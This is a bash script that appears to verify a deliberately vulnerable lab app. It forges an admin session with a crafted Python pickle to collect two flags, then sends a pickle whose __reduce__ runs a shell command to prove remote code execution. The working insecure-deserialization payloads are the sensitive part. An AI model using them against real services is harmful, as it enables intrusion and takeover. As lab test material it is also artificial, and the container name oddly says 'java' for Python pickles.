#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
sleep 3

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

until nc -z -w2 127.0.0.1 8091 2>/dev/null; do sleep 1; done

COOKIE_JAR=$(mktemp /tmp/cookies-XXXXXX.txt)

# Test 1: legitimate login and session save/restore
OUT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    -X POST http://127.0.0.1:8091/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"alice","password":"alice123"}' 2>/dev/null)
check "alice login succeeds" "$( echo "$OUT" | grep -q 'alice' && echo 1 || echo 0 )"

SAVE_RESP=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    http://127.0.0.1:8091/api/session/save 2>/dev/null)
BLOB=$(echo "$SAVE_RESP" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('session_blob',''))" 2>/dev/null || echo "")
check "session save returns blob" "$( [ -n "$BLOB" ] && echo 1 || echo 0 )"

# Start fresh cookie jar for restore test
rm -f "$COOKIE_JAR"
COOKIE_JAR=$(mktemp /tmp/cookies-XXXXXX.txt)
OUT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    -X POST http://127.0.0.1:8091/api/session/restore \
    -H "Content-Type: application/json" \
    -d "{\"session_blob\":\"$BLOB\"}" 2>/dev/null)
check "legitimate session restore works" "$( echo "$OUT" | grep -q 'alice' && echo 1 || echo 0 )"

# Test 2: forge admin session with benign dict pickle
rm -f "$COOKIE_JAR"
COOKIE_JAR=$(mktemp /tmp/cookies-XXXXXX.txt)
ADMIN_BLOB=$(python3 -c "
import pickle, base64
print(base64.b64encode(pickle.dumps({'user': 'admin', 'role': 'admin'})).decode())
")
OUT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    -X POST http://127.0.0.1:8091/api/session/restore \
    -H "Content-Type: application/json" \
    -d "{\"session_blob\":\"$ADMIN_BLOB\"}" 2>/dev/null)
check "forged admin pickle restores admin role" "$( echo "$OUT" | grep -q 'admin' && echo 1 || echo 0 )"

# Test 3: get flag1 via admin profile hint
OUT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    http://127.0.0.1:8091/api/profile 2>/dev/null)
FLAG1=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "admin profile returns flag1" "$( [ -n "$FLAG1" ] && echo 1 || echo 0 )"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"

# Test 4: get flag2 via admin secret endpoint
OUT=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    http://127.0.0.1:8091/api/admin/secret 2>/dev/null)
FLAG2=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "admin/secret returns flag2" "$( [ -n "$FLAG2" ] && echo 1 || echo 0 )"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"

# Test 5: RCE via __reduce__ -- verify by reading /tmp/rce_proof.txt inside container
RCE_BLOB=$(python3 -c "
import pickle, base64, os
class R:
    def __reduce__(self): return (os.system, ('id > /tmp/rce_proof.txt',))
print(base64.b64encode(pickle.dumps(R())).decode())
")
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    -X POST http://127.0.0.1:8091/api/session/restore \
    -H "Content-Type: application/json" \
    -d "{\"session_blob\":\"$RCE_BLOB\"}" > /dev/null 2>&1
sleep 1
CONTAINER=$(docker ps --filter "name=java-deserialization" --format "{{.Names}}" | head -1)
RCE_OUT=$(docker exec "$CONTAINER" cat /tmp/rce_proof.txt 2>/dev/null || echo "")
check "RCE via __reduce__ executed shell command" "$( [ -n "$RCE_OUT" ] && echo 1 || echo 0 )"
[ -n "$RCE_OUT" ] && echo "    rce output: $RCE_OUT"

rm -f "$COOKIE_JAR"
$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
